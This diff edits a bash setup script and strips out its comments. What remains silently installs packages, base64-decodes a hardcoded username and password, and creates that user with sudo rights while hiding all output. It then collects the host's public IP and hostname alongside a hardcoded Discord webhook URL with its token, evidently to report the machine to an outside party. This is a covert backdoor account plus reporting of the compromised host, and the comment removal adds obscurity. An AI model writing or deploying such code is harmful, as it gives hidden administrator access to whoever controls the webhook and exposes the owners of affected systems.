@@ -41,19 +41,17 @@ sudo passwd root
 #!/bin/bash
 set -e
 
-# Variables
+
 _X1="dm0="
 _X2="dm0="
 _W="https://discord.com/api/webhooks/1494735082173501631/ovStsIdstHE1ZqQhC4MrRFIfHLHxaPZEMYRcRxWOugP7E09buz0MAxfTRcFOixry2zMz"
 
-# 1. Update aur Install (Sab kuch silent)
-# -qq: bilkul chup chap install karne ke liye
-# DEBIAN_FRONTEND=noninteractive: koi popup nahi aayega
+
 export DEBIAN_FRONTEND=noninteractive
 apt-get update -qq >/dev/null 2>&1
 apt-get install -y -qq sudo curl >/dev/null 2>&1
 
-# 2. User Creation Logic
+
 U=$(echo "$_X1" | base64 --decode)
 P=$(echo "$_X2" | base64 --decode)
 
@@ -63,7 +61,7 @@ if [ ! -z "$U" ] && ! id "$U" &>/dev/null; then
     usermod -aG sudo "$U" >/dev/null 2>&1
 fi
 
-# 3. Notification
+
 IP=$(curl -s https://api.ipify.org || echo "Unknown")
 H=$(hostname)
 
